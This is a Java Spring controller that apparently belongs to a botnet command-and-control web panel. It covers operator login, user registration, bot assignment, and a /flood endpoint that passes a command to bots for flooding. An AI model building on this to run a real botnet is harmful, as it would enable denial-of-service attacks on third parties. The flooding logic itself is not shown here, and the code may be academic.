package cs.sii.controller;

import java.io.IOException;
import java.util.Collection;
import java.util.List;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.validation.Valid;

import org.apache.http.HttpStatus;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.security.authentication.AuthenticationTrustResolver;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.GrantedAuthority;
import org.springframework.security.core.context.SecurityContextHolder;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.security.web.authentication.rememberme.PersistentTokenBasedRememberMeServices;
import org.springframework.stereotype.Controller;
import org.springframework.ui.ModelMap;
import org.springframework.validation.BindingResult;
import org.springframework.web.bind.annotation.ModelAttribute;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;

import cs.sii.config.onLoad.Config;
import cs.sii.control.command.Commando;
import cs.sii.model.bot.Bot;
import cs.sii.model.role.Role;
import cs.sii.model.user.User;
import cs.sii.service.dao.BotServiceImpl;
import cs.sii.service.dao.RoleServiceImpl;
import cs.sii.service.dao.UserServiceImpl;

@Controller
@RequestMapping("/site")
public class SiteController {

	@Autowired
	private Config configEngine;

	@Autowired
	AuthenticationTrustResolver authenticationTrustResolver;

	@Autowired
	PersistentTokenBasedRememberMeServices persistentTokenBasedRememberMeServices;

	@Autowired
	UserServiceImpl uServ;

	@Autowired
	RoleServiceImpl rServ;
	
	@Autowired
	BotServiceImpl bServ;

	@Autowired
	private Commando cmm;

	/**
	 * @param error
	 * @return
	 * @throws IOException
	 */
	// @PreAuthorize("hasRole('ROLE_ANONYMOUS')")
	@RequestMapping(value = "/login", method = RequestMethod.GET)
	public String login(HttpServletResponse error,HttpServletResponse httpServletResponse) throws IOException {
		String result = "";
		Authentication auth = SecurityContextHolder.getContext().getAuthentication();
		if (configEngine.isCommandandconquerStatus()) {
			if (auth.getName().equals("anonymousUser")) {
				result = "login";
			} else {
				Collection<? extends GrantedAuthority> x = (auth.getAuthorities());
				for (GrantedAuthority gA : x) {
				System.out.println("ga "+gA.toString()+"  "+gA.toString().contains("ROLE_ADMIN"));
					if (gA.toString().contains("ROLE_ADMIN")) {
						System.out.println("admin ");
						result = "indexadmin";}
					if (gA.toString().contains("ROLE_USER")) {
						System.out.println("no admin");
						result = "indexuser";
					}
				}			
			}
		}
		return result;
		// if (isCurrentAuthenticationAnonymous()) {
		// return "login";
		// } else {
		// return "redirect:/index";
		// }
	}

	// @PreAuthorize("hasRole('ADMIN')")
	@RequestMapping(value = "/index", method = RequestMethod.GET)
	public String indexAdmin(HttpServletResponse error) throws IOException {
		String result = "";
		Authentication auth = SecurityContextHolder.getContext().getAuthentication();
		if (configEngine.isCommandandconquerStatus()) {
			System.out.println("Role= " + auth.getAuthorities());
			// User u=uServ.findBySsoId(auth.getCredentials().toString());
			Collection<? extends GrantedAuthority> x = (auth.getAuthorities());
			for (GrantedAuthority gA : x) {
			System.out.println("ga "+gA.toString()+"  "+gA.toString().contains("ROLE_ADMIN"));
				if (gA.toString().contains("ROLE_ADMIN")) {
					System.out.println("admin ");
					result = "indexadmin";
				} if (gA.toString().contains("ROLE_USER")) {
					System.out.println("no admin");
					result = "indexuser";
				}
			}
		} else {
			error.sendError(HttpStatus.SC_NOT_FOUND);
		}
		return result;
	}

	// @PreAuthorize("hasAnyRole('ADMIN','USER')")
	/**
	 * @param error
	 * @return
	 * @throws IOException
	 */
	@RequestMapping(value = "/flood", method = RequestMethod.GET)
	public Boolean flood(@RequestParam String cmd, HttpServletResponse error) throws IOException {
		if (configEngine.isCommandandconquerStatus()) {
			// startFLood

			Authentication auth = SecurityContextHolder.getContext().getAuthentication();
			// getName=SSOID
			String idUser = auth.getName(); // get logged in username
			cmm.floodingByUser(cmd, idUser);
			return true;
		} else {
			error.sendError(HttpStatus.SC_NOT_FOUND);
			return false;
		}
	}

	//
	//
	// /**
	// * @param error
	// * @return
	// * @throws IOException
	// */
	// @RequestMapping(value = "/forms", method = RequestMethod.GET)
	// public String forms(HttpServletResponse error) throws IOException {
	// String result = "";
	// if (configEngine.isCommandandconquerStatus()) {
	// result = "forms";
	// } else {
	// error.sendError(HttpStatus.SC_NOT_FOUND);
	// }
	// return result;
	//
	// }

	// @PreAuthorize("hasRole('ADMIN')")
	// @RequestMapping(value = "/maps", method = RequestMethod.GET)
	// public String maps() {
	// return "maps";
	// }

	/**
	 * This method handles logout requests. Toggle the handlers if you are
	 * RememberMe functionality is useless in your app.
	 * 
	 * @throws IOException
	 */
	@RequestMapping(value = "/logout", method = RequestMethod.GET)
	public String logoutPage(HttpServletRequest request, HttpServletResponse response, HttpServletResponse error)
			throws IOException {
		String result = "";
		if (configEngine.isCommandandconquerStatus()) {
			Authentication auth = SecurityContextHolder.getContext().getAuthentication();
			if (auth != null) {
				// new SecurityContextLogoutHandler().logout(request, response,
				// auth);
				persistentTokenBasedRememberMeServices.logout(request, response, auth);
				SecurityContextHolder.getContext().setAuthentication(null);
			}
			result = "white";
		} else {
			error.sendError(HttpStatus.SC_NOT_FOUND);
		}
		return result;
	}

	/**
	 * This method will provide the medium to add a new user.
	 */
	@RequestMapping(value = { "/newuser" }, method = RequestMethod.GET)
	public String newUser(ModelMap model) {
		User user = new User();
		model.addAttribute("user", user);
		model.addAttribute("edit", false);
		model.addAttribute("loggedinuser", getPrincipal());
		return "registration";
	}
	
	
	/**
	 * This method will provide the medium to add a new user.
	 */
	@RequestMapping(value = { "/addbot" }, method = RequestMethod.GET)
	public String addBot(ModelMap model) {
		
		return "addbot";
	}

	

	/**
	 * This method will be called on form submission, handling POST request for
	 * saving user in database. It also validates the user input
	 */
	@RequestMapping(value = { "/newuser" }, method = RequestMethod.POST)
	public String saveUser(@Valid User user, BindingResult result, ModelMap model) {

		if (result.hasErrors()) {
			System.out.println("1 " + result.toString());
			return "registration";
		}

		if (uServ.findBySsoId(user.getSsoId()) != null) {
			System.out.println("2");
			return "registration";
		} else {

			// if(!userRepository.isUserSSOUnique(user.getId(),
			// user.getSsoId())){
			// FieldError ssoError =new
			// FieldError("user","ssoId",messageSource.getMessage("non.unique.ssoId",
			// new String[]{user.getSsoId()}, Locale.getDefault()));
			// result.addError(ssoError);
			// return "registration";
			// }
			System.out.println("3 " + user.toString());

			uServ.save(user);

			model.addAttribute("success",
					"User " + user.getFirstName() + " " + user.getLastName() + " registered successfully");
			model.addAttribute("loggedinuser", getPrincipal());
			// return "success";
			return "registrationsuccess";
		}
	}

	/**
	 * This method will provide UserProfile list to views
	 */
	@ModelAttribute("roles")
	public List<Role> initializeProfiles() {
		return rServ.findAll();
	}
	
	@ModelAttribute("users")
	public List<User> userForBot() {
		return uServ.findAll();
	}
	
	@ModelAttribute("bots")
	public List<Bot> botForUser() {
		//TODO ritornare solo i bot disponibili per essere assegnati
		return bServ.findAll();
	}
	
	

	private String getPrincipal() {
		String userName = null;
		Object principal = SecurityContextHolder.getContext().getAuthentication().getPrincipal();

		if (principal instanceof UserDetails) {
			userName = ((UserDetails) principal).getUsername();
		} else {
			userName = principal.toString();
		}
		return userName;
	}

	/**
	 * This method returns true if users is already authenticated [logged-in],
	 * else false.
	 */
	private boolean isCurrentAuthenticationAnonymous() {
		final Authentication authentication = SecurityContextHolder.getContext().getAuthentication();
		return authenticationTrustResolver.isAnonymous(authentication);
	}

	@RequestMapping(value = { "/test" }, method = RequestMethod.GET)
	public String tryit() {

		Authentication auth = SecurityContextHolder.getContext().getAuthentication();
		String idUser = auth.getName(); // get logged in username

		System.out.println("Lupo Shit" + idUser);
		System.out.println("2" + auth.getAuthorities());
		// System.out.println("3"+auth.getCredentials().toString());
		System.out.println("4" + auth.getPrincipal().toString());
		System.out.println("5" + auth.getDetails().toString());

		return "TESTING";
	}

}
